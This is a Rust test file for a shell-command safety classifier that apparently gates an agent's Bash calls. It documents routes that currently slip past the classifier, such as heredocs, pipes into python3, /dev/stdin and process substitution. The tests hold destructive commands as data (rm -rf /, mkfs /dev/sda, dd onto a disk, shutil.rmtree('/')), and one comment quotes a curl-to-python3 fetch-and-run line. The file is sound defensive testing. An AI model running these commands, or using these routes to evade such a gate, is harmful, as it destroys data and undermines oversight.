// このファイルは丸ごと integration test なので unwrap/expect を許可する
// (workspace の [workspace.lints.clippy] は production 向けの deny)。
#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
//! Inline-eval SHAPE-verdict + stdin-mirror closure for code interpreters
//! (`python`/`perl`/`ruby`/`node`/`php`/`lua`).
//!
//! Written by a DISINTERESTED author (CLAUDE.md §2(a)) — this file judges an
//! implementation it did not write, and `crates/blastguard/src/` was not
//! touched while writing it. Every verdict recorded in the comments below was
//! OBSERVED by running the classifier at commit `d47f0a4b` (2026-09-08), not
//! predicted; see the per-case RED/GREEN annotations.
//!
//! # The two defects pinned here
//!
//! **(1) Deny on SHAPE, without auditing the payload.** `detect.rs` has one arm
//! (~:3827) that denies any `is_code_interpreter(cmd)` carrying a token that
//! `is_inline_eval_flag` matches. The payload is never read. So
//! `python3 -c "print(1)"` is Denied with the reason "can run an arbitrary
//! destructive command" — a claim about a payload nothing inspected. Shells get
//! the opposite treatment: `bash -c "…"` re-analyses its payload
//! (`dash_c_payloads` + `analyze_shell_payload`), which is why
//! `bash -c "echo hi"` is `Allow` while `bash -c "rm -rf /"` is `Deny`. Per
//! `model.rs:5` ("Three answers, not two") the sanctioned answer when the gate
//! cannot PROVE destruction is `Ask` — "not a verdict about the command, it is
//! a refusal to guess" — not `Deny`.
//!
//! **(2) The stdin mirrors are `Allow`.** Every construct below delivers
//! exactly the same capability (arbitrary interpreter code) with no `-c`, and
//! every one of them was OBSERVED to return `Allow`:
//!
//! | mirror | probe | observed |
//! |---|---|---|
//! | heredoc          | `python3 - <<EOF … EOF`                    | Allow |
//! | here-string      | `python3 - <<<"…"`                         | Allow |
//! | pipe into interp | `echo "…" \| python3`                      | Allow |
//! | bare stdin dash  | `cat evil.py \| python3 -`                 | Allow |
//! | explicit stdin   | `python3 /dev/stdin`                       | Allow |
//! | process subst    | `python3 <(echo "…")`                      | Allow |
//!
//! The same file already reaches the OPPOSITE conclusion about the third row:
//! `stage_is_interpreter_terminal` (~:5104) treats `… | python3` as a
//! code-exec sink in the egress path (`curl https://evil/x | python3` IS
//! denied today, by that rule). One file, two answers about one construct.
//!
//! # An important non-finding: the here-string is not "already covered"
//!
//! `python3 - <<<"import os; os.system('rm -rf /')"` returns `Deny` today, and
//! that looks like the here-string mirror is closed. It is not. The Deny is an
//! ACCIDENT of tokenisation: `-rf` is a bare whitespace token, and
//! `is_inline_eval_flag("-rf")` is true because it is a short flag whose
//! bundled letters contain `r`. The reason string is the inline-eval one, not a
//! here-string one. Swap the payload for a dash-free destructive equivalent —
//! `os.system('mkfs /dev/sda')` — and the same shape is `Allow`. Every
//! here-string case in this file is therefore written dash-free, so it can
//! never pass for that accidental reason.
//!
//! # Anti-vacuity
//!
//! `controls()` and `interpreter_script_file_invocation_stays_allow()` assert
//! `Allow`. A "fix" that blocks everything — the trivial way to make every
//! other assertion here pass — is caught by them.

use blastguard::detect::detect;
use blastguard::model::Decision;
use serde_json::json;

fn bash(cmd: &str) -> Decision {
    detect("Bash", Some(&json!({ "command": cmd })))
}

/// A blocking verdict is `Deny` OR `Ask`: both stop the call from running
/// unreviewed, and `Decision::hardened` collapses `Ask` to `Deny` wherever no
/// human is present to answer. This is the right predicate for the mirror
/// tests, whose requirement is "at minimum Ask" — pinning the fail-open
/// closure without over-specifying which of the two restrictive answers the
/// implementation picks.
#[track_caller]
fn assert_blocking(cmd: &str) {
    let d = bash(cmd);
    assert!(
        d.is_blocking(),
        "expected a blocking verdict (Ask or Deny) for `{}`, got {d:?}",
        cmd.replace('\n', "\\n")
    );
}

#[track_caller]
fn assert_deny(cmd: &str) {
    let d = bash(cmd);
    assert!(
        d.is_deny(),
        "expected Deny for `{}`, got {d:?}",
        cmd.replace('\n', "\\n")
    );
}

/// Strictly `Ask`, not `Deny`. `is_blocking()` is true for both, so a test that
/// only checked "did it block" would not observe defect (1) at all — the whole
/// point is that the current answer is the WRONG restrictive answer.
#[track_caller]
fn assert_ask(cmd: &str) {
    let d = bash(cmd);
    assert!(
        d.is_ask(),
        "expected Ask (a refusal to guess, not a verdict) for `{}`, got {d:?}",
        cmd.replace('\n', "\\n")
    );
}

#[track_caller]
fn assert_allow(cmd: &str) {
    let d = bash(cmd);
    assert_eq!(
        d,
        Decision::Allow,
        "expected Allow for `{}`",
        cmd.replace('\n', "\\n")
    );
}

// ---------------------------------------------------------------------------
// Anti-vacuity controls. If these fail, nothing else in this file means
// anything: they are the only assertions that a deny-everything "fix" breaks.
// Both were OBSERVED Allow today (GREEN) and must stay Allow.
// ---------------------------------------------------------------------------

#[test]
fn controls() {
    // Ordinary non-interpreter commands must stay untouched.
    assert_allow("ls -la");
    assert_allow("git status");
}

/// Running a script FILE is explicitly OUT OF SCOPE for this change: it must
/// stay exactly as permissive as it is today. This is both an anti-vacuity
/// control and a scope fence. GREEN today, must stay GREEN.
#[test]
fn interpreter_script_file_invocation_stays_allow() {
    assert_allow("python3 script.py");
    assert_allow("python3 -u script.py");
    assert_allow("python3 -m http.server");
    assert_allow("node server.js");
    assert_allow("ruby app.rb");
}

// ---------------------------------------------------------------------------
// Defect (1): the inline-eval arm denies on shape.
// ---------------------------------------------------------------------------

/// Destructive inline payloads must remain `Deny`. GREEN today — but today it
/// is green for the wrong reason (shape alone). Once the payload is actually
/// audited, this is the test that proves the audit still recognises these.
/// Note this REQUIRES interpreter-language knowledge, not just shell
/// re-analysis: `shutil.rmtree('/')` and `os.remove(...)` are Python calls with
/// no shell spelling.
#[test]
fn destructive_inline_payload_is_denied() {
    assert_deny(r#"python3 -c "import shutil; shutil.rmtree('/')""#);
    assert_deny(r#"python3 -c "import os; os.remove('/etc/passwd')""#);
    assert_deny(r#"perl -e 'system("rm -rf /")'"#);
    assert_deny(r#"python3 -c "import os; os.system('mkfs /dev/sda')""#);
    assert_deny(r#"python3 -c "import os; os.system('dd of=/dev/sda if=/dev/zero')""#);
}

/// A benign — or simply unanalysable — inline payload must resolve to `Ask`,
/// the refusal to guess, NOT to a `Deny` that asserts "can run an arbitrary
/// destructive command" about a payload nothing read.
///
/// RED today: every one of these is `Deny`.
#[test]
fn benign_inline_payload_is_ask_not_deny() {
    assert_ask(r#"python3 -c "print(1)""#);
    assert_ask(r#"node -e "console.log(1)""#);
    assert_ask(r#"ruby -e 'puts 1'"#);
    assert_ask(r#"perl -e 'print 1'"#);
    assert_ask(r#"php -r 'echo 1;'"#);
    assert_ask(r#"lua -e 'print(1)'"#);
    assert_ask(r#"node -p "1+1""#);
}

/// The bundled short-flag path (`-ic` = `-i` + `-c`, CA-blastguard-007) must
/// land on the same verdict as the unbundled spelling — the bundling is a
/// spelling of the same capability, so it must not be a way to get a DIFFERENT
/// answer in either direction.
///
/// Mixed today: the benign case is RED (`Deny`), the destructive case GREEN.
#[test]
fn bundled_short_eval_flag_matches_unbundled() {
    assert_ask(r#"python3 -ic "print(1)""#);
    assert_deny(r#"python3 -ic "import shutil; shutil.rmtree('/')""#);
    // Equality of the two spellings, stated directly, so a fix that special-
    // cases one of them is caught even if both happen to be blocking.
    assert_eq!(
        bash(r#"python3 -ic "print(1)""#),
        bash(r#"python3 -i -c "print(1)""#),
        "bundled `-ic` and split `-i -c` must produce the same verdict"
    );
}

// ---------------------------------------------------------------------------
// Defect (2): the stdin mirrors. Primary requirement — NOT `Allow`.
// Every assertion in this section is RED today (all six observed `Allow`).
// ---------------------------------------------------------------------------

/// `python3 - <<EOF … EOF` — the heredoc body IS the program.
/// Contrast: `bash <<EOF\nrm -rf /\nEOF` is already `Deny` today. Shells get
/// heredoc payload analysis; interpreters do not.
#[test]
fn mirror_heredoc_is_not_allow() {
    assert_blocking("python3 - <<EOF\nimport os\nos.system('mkfs /dev/sda')\nEOF");
    assert_blocking("python3 <<'PY'\nimport shutil\nshutil.rmtree('/')\nPY");
    assert_blocking("perl - <<EOF\nsystem(\"mkfs /dev/sda\");\nEOF");
}

/// `python3 - <<<"…"` — dash-free payloads only, so the `-rf` tokenisation
/// accident documented in the module header cannot make these pass.
#[test]
fn mirror_here_string_is_not_allow() {
    assert_blocking(r#"python3 - <<<"import os; os.system('mkfs /dev/sda')""#);
    assert_blocking(r#"python3 - <<<"import shutil; shutil.rmtree('/')""#);
    assert_blocking(r#"python3 - <<<"import os; os.system('dd of=/dev/sda if=/dev/zero')""#);
}

/// `echo "…" | python3` — the exact construct `stage_is_interpreter_terminal`
/// (~:5104) already classifies as a code-exec sink on the egress path.
#[test]
fn mirror_pipe_into_interpreter_is_not_allow() {
    assert_blocking(r#"echo "import os; os.system('mkfs /dev/sda')" | python3"#);
    assert_blocking(r#"echo "import shutil; shutil.rmtree('/')" | python3"#);
    assert_blocking(r#"printf '%s' "import os" | node"#);
}

/// `cat evil.py | python3 -` — the explicit `-` stdin operand. The payload is
/// NOT visible on the command line, so `Ask` is the honest answer here and
/// this test deliberately does not demand `Deny`.
#[test]
fn mirror_bare_stdin_dash_is_not_allow() {
    assert_blocking("cat evil.py | python3 -");
    assert_blocking("cat evil.pl | perl -");
}

/// `python3 /dev/stdin` — the same capability spelled as a file path. Payload
/// invisible, so `Ask` again.
#[test]
fn mirror_explicit_stdin_path_is_not_allow() {
    assert_blocking("python3 /dev/stdin");
    assert_blocking("python3 /dev/stdin < evil.py");
    assert_blocking("cat evil.py | python3 /dev/stdin");
}

/// `python3 <(echo "…")` — process substitution hands the interpreter a fd
/// path whose contents are right there on the command line.
#[test]
fn mirror_process_substitution_is_not_allow() {
    assert_blocking(r#"python3 <(echo "import os; os.system('mkfs /dev/sda')")"#);
    assert_blocking(r#"python3 <(echo "import shutil; shutil.rmtree('/')")"#);
    assert_blocking(r#"node <(echo "console.log(1)")"#);
}

// ---------------------------------------------------------------------------
// Defect (2), strict half: where the destructive payload is VISIBLE in the
// mirror, the answer is `Deny`, not `Ask` — the gate can read it, so it is not
// entitled to the refusal-to-guess answer.
//
// Split out from the `is_not_allow` tests on purpose: these are strictly
// stronger, and if a reviewer rules them over-specified, the fail-open closure
// above still stands on its own. RED today (all `Allow`).
// ---------------------------------------------------------------------------

/// Shell-level destructive payload inside the mirror. Achievable with the
/// analysis that already exists: `mkfs /dev/sda` and `dd of=/dev/sda` are both
/// `Deny` today when fed to the classifier as bare commands, so re-analysing a
/// mirror payload the way `bash -c` payloads are re-analysed reaches these.
#[test]
fn visible_shell_destructive_payload_in_mirror_is_denied() {
    assert_deny(r#"python3 - <<<"import os; os.system('mkfs /dev/sda')""#);
    assert_deny("python3 - <<EOF\nimport os\nos.system('mkfs /dev/sda')\nEOF");
    assert_deny(r#"echo "import os; os.system('mkfs /dev/sda')" | python3"#);
    assert_deny(r#"python3 <(echo "import os; os.system('mkfs /dev/sda')")"#);
}

/// Interpreter-level destructive payload inside the mirror. This is the
/// STRICTEST requirement in the file: it needs the same Python-level knowledge
/// that `destructive_inline_payload_is_denied` already requires of the `-c`
/// path, applied to the mirrors too. Kept in its own test so it can be judged
/// separately from everything above.
#[test]
fn visible_interpreter_destructive_payload_in_mirror_is_denied() {
    assert_deny(r#"python3 - <<<"import shutil; shutil.rmtree('/')""#);
    assert_deny("python3 - <<EOF\nimport shutil\nshutil.rmtree('/')\nEOF");
    assert_deny(r#"echo "import shutil; shutil.rmtree('/')" | python3"#);
}

// ---------------------------------------------------------------------------
// Asymmetry witness: what the interpreter path is being held to is exactly
// what the SHELL path already does. GREEN today — pinned so that a fix which
// "unifies" the two paths cannot do it by dragging the shell path down to the
// interpreter path's behaviour.
// ---------------------------------------------------------------------------

/// The SHELL twin of the six interpreter mirrors. `sh`/`bash` reading their
/// program from an upstream stage is the same capability, and it was open:
/// `echo 'rm -rf /' | bash` was measured `Allow` before the fix (reported
/// alongside the six mirrors as an adjacent hole, out of that task's scope).
/// It is closed now, and nothing else pins it — the `detect.rs` control that
/// used to observe `/bin/rm | sh == Allow`
/// (`invariance_the_pipe_egress_arm_still_asks_when_that_literal_is_destructive`)
/// was about a different arm and has been re-anchored to that arm's reason.
#[test]
fn shell_stdin_program_mirror_is_judged() {
    // Visible destructive program: Deny.
    assert_deny("echo 'rm -rf /' | bash");
    // Unreadable program: Ask, not Allow.
    assert_blocking("cat script.sh | sh");
    assert_blocking("/bin/rm | sh");
    // Anti-vacuity: a pipeline whose sink is NOT a program-taking interpreter
    // must stay Allow, or this closure has become "block every pipe".
    assert_allow("cat notes.txt | wc -l");
    assert_allow("git log | head -20");
}

#[test]
fn shell_payload_analysis_is_the_reference_behaviour() {
    // A shell's inline payload IS read: benign stays Allow...
    assert_allow(r#"bash -c "echo hi""#);
    // ...destructive is Denied on the payload's own merits.
    assert_deny(r#"bash -c "rm -rf /""#);
    // And a shell heredoc body is read too — the mirror the interpreter path
    // is missing.
    assert_deny("bash <<EOF\nrm -rf /\nEOF");
}

// ---------------------------------------------------------------------------
// SPEC EXTENSION — flagged for human ruling (CLAUDE.md §5: surface it, do not
// silently decide it).
//
// These were NOT in the task's list of cases. They are what the spec bullet
// "inline-eval with a benign/unanalysable payload -> Ask, NOT Deny" implies
// when applied to commands that merely CONTAIN a token `is_inline_eval_flag`
// matches without any inline eval happening at all. All three are `Deny`
// today (RED), and all three are ordinary, extremely common commands:
//
//   python3 -m pip install -r req.txt   ->  Deny   (`-r` is pip's flag)
//   python3 manage.py -p 8000           ->  Deny   (`-p` is the app's flag)
//   python3 train.py -rf                ->  Deny   (`-rf` is the app's flag)
//
// These are script-FILE / module invocations, which the task marked out of
// scope — but "out of scope" there meant "do not TIGHTEN it", and this is a
// false Deny, i.e. the opposite. I did not want to decide unilaterally whether
// fixing it belongs in this change, so it is pinned here as its own test
// rather than buried in prose. If the spec owner rules it out of scope, that
// ruling should be recorded on the ticket before this test is removed.
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// A Deny must be a FINDING, not a substring hit somewhere on the line.
//
// `analyze_interpreter_stdin_exec` runs `interpreter_destructive_call` over the
// WHOLE command text, not over the program the stage actually receives, and the
// needle list contains bare English words (`"unlink "`, `"rmdir "`). Both cases
// below are Deny today, and both reasons state a finding that is false:
//
//   echo 'please unlink (later)' | python3
//     -> Deny "…that program runs `unlink `, which deletes files or
//        directories outright". The program is the STRING "please unlink
//        (later)". Nothing on this line deletes anything.
//
//   rmdir olddir; echo hi | python3
//     -> Deny "`python3` takes its program from stdin, and that program runs
//        `rmdir `…". The `rmdir` is in a DIFFERENT statement, and `rmdir
//        olddir` on its own is Allow. The program is `hi`.
//
// This is the §4 failure mode aimed at a human instead of a reviewer: the
// reason string asserts something the code did not observe. The honest verdict
// for both is the same `Ask` the arm already gives an unreadable program — the
// closure does not depend on the guess.
//
// RED today.
// ---------------------------------------------------------------------------

#[test]
fn stdin_mirror_deny_must_come_from_the_program_not_from_elsewhere_on_the_line() {
    for cmd in [
        "echo 'please unlink (later)' | python3",
        "rmdir olddir; echo hi | python3",
    ] {
        let d = bash(cmd);
        assert!(
            !d.is_deny(),
            "`{cmd}` contains no destructive operation — the piped program is \
             not a deletion call — so a Deny here states a finding that was \
             never observed; Ask is the honest answer. Got {d:?}"
        );
        // ...but it must still be judged: this is not a licence to fall back to
        // Allow.
        assert!(
            d.is_blocking(),
            "`{cmd}` still feeds an unreadable program to an interpreter and \
             must not drop to Allow. Got {d:?}"
        );
    }
}

#[test]
fn flag_lookalike_without_inline_eval_is_not_denied() {
    for cmd in [
        "python3 -m pip install -r req.txt",
        "python3 manage.py -p 8000",
        "python3 train.py -rf",
    ] {
        let d = bash(cmd);
        assert!(
            !d.is_deny(),
            "expected Allow or Ask for `{cmd}` (no inline eval happens here; \
             the matched token is the script's own flag), got {d:?}"
        );
    }
}
